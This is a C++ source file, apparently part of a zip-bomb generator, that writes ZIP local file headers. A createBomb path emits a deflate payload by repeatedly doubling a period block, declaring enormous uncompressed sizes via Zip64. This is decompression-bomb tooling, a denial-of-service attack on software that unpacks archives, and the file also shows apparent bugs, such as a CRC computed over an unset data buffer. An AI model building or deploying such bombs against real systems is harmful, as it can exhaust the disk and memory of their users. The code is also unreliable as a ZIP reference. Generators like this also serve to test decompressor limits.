//
// Created by LeeEeZian on 9/9/2026.
//
#include "zip_file_construction/LocalFileHeader.h"

#include <iostream>

#include "factory/PayloadFactory.h"
#include "Helper.h"
#include "deflation/BitWriter.h"
#include "zip_file_construction/Zip64.h"
#include <span>

#include "Timer.h"

namespace {
    void repeatInPlace(std::vector<uint8_t> &vector, const size_t n) {
        if (n <= 1) return;
        const size_t originalSize{vector.size()};
        vector.resize(vector.size() * n);

        size_t newSize{originalSize};
        while (newSize < vector.size()) {
            std::copy_n(vector.begin(), originalSize, vector.begin() + static_cast<long long>(newSize));
            newSize += originalSize;
        }
    }
}


LocalFileHeader::LocalFileHeader(const FileHeaderConstructConfig &config) : version_{config.version},
                                                                            flags_{config.flags},
                                                                            compressionMethod_{
                                                                                config.compressionMethod
                                                                            },
                                                                            modTime_{config.modTime},
                                                                            modDate_{config.modDate},
                                                                            compressedSize_{config.compressedSize},
                                                                            uncompressedSize_{config.uncompressedSize},
                                                                            fileName_{config.fileName},
                                                                            extraField_{config.extraField},
                                                                            bombRecipe_{config.bombRecipe} {
    if (config.crc32.has_value()) {
        crc32_ = config.crc32.value();
    } else {
        Crc32 crc{};
        for (const uint8_t byte: data_) {
            crc.update(byte);
        }
        crc.computeCrc32();
        crc32_ = crc.getCrc32();
    }
}

size_t LocalFileHeader::serializeTo(std::ofstream &out) {
    using namespace helper;
    size_t size{};

    std::vector<uint8_t> serialized;
    appendBytes32Small(serialized, signature);
    appendBytes16Small(serialized, version_);
    appendBytes16Small(serialized, flags_);
    appendBytes16Small(serialized, compressionMethod_);
    appendBytes16Small(serialized, modTime_);
    appendBytes16Small(serialized, modDate_);

    appendBytes32Small(serialized, crc32_);

    const bool useZip64 = (uncompressedSize_ >= 0xFFFFFFFFULL || compressedSize_ >= 0xFFFFFFFFULL);
    if (useZip64) {
        appendBytes32Small(serialized, 0xFFFFFFFF);
        appendBytes32Small(serialized, 0xFFFFFFFF);

        extraField_.id = Zip64ExtraBlock::ZIP64_EXTENDED_INFO;
        appendBytes64Small(extraField_.data, uncompressedSize_);
        appendBytes64Small(extraField_.data, compressedSize_);
    } else {
        appendBytes32Small(serialized, compressedSize_);
        appendBytes32Small(serialized, uncompressedSize_);
    }


    appendBytes16Small(serialized, static_cast<uint16_t>(fileName_.size()));
    appendBytes16Small(serialized, static_cast<uint16_t>(extraField_.size()));

    serialized.insert(serialized.end(), fileName_.begin(), fileName_.end());

    if (useZip64) {
        std::vector<uint8_t> serializedExtraField{extraField_.serialize()};
        serialized.insert(serialized.end(), serializedExtraField.begin(), serializedExtraField.end());
    }

    size+= serialized.size();

    writeFile(out, serialized);


    if (!bombRecipe_.has_value()) {
        const auto start{std::chrono::steady_clock::now()};

        Timer lfhWrite{"Writing lfh data"};
        writeFile(out, data_);
    }

    if (bombRecipe_.has_value()) {
        Timer lfhWrite{"Writing lfh bomb data"};

        size+=bombRecipe_->start.size();
        writeFile(out, bombRecipe_->start);

        size_t periodSize{bombRecipe_->period.size()};
        while (bombRecipe_->numberOfPeriods) {
            if (bombRecipe_->numberOfPeriods & 1) {
                size+=periodSize;
                writeFile(out, bombRecipe_->period);
            }

            bombRecipe_->numberOfPeriods >>= 1;
            periodSize*=2;
            repeatInPlace(bombRecipe_->period, 2);
        }
        size+=bombRecipe_->end.size();

        writeFile(out, bombRecipe_->end);
    }

    return size;
}

LocalFileHeader LocalFileHeader::createStored(std::string fileName, std::string data) {
    FileHeaderConstructConfig config{};
    config.version = static_cast<uint16_t>(Version::ORIGINAL);
    config.flags = 0;
    config.compressionMethod = static_cast<uint16_t>(Compression::STORED);
    config.modTime = 0;
    config.modDate = 0;

    config.compressedSize = static_cast<uint32_t>(data.size());
    config.uncompressedSize = static_cast<uint32_t>(data.size());
    config.fileName.assign(fileName.begin(), fileName.end());
    config.extraField = {};

    config.data.assign(data.begin(), data.end());

    return LocalFileHeader{config};
}

LocalFileHeader LocalFileHeader::createBomb(std::string fileName, const size_t size) {
    auto [recipe,uncompressedSize,compressedSize,crc32]{payloadFactory::createFixedBombPayload(size)};
    FileHeaderConstructConfig config{};


    if (uncompressedSize >= 0xFFFFFFFFULL || compressedSize >= 0xFFFFFFFFULL) {
        config.version = static_cast<uint16_t>(Version::ZIP64);
    } else {
        config.version = static_cast<uint16_t>(Version::DEFLATE);
    }
    config.flags = 0;
    config.compressionMethod = static_cast<uint16_t>(Compression::DEFLATE);
    config.modTime = 0;
    config.modDate = 0;

    config.compressedSize = compressedSize;
    config.uncompressedSize = uncompressedSize;
    config.fileName.assign(fileName.begin(), fileName.end());
    config.extraField = {};

    config.crc32 = crc32;
    config.bombRecipe = recipe;


    return LocalFileHeader{config};
}
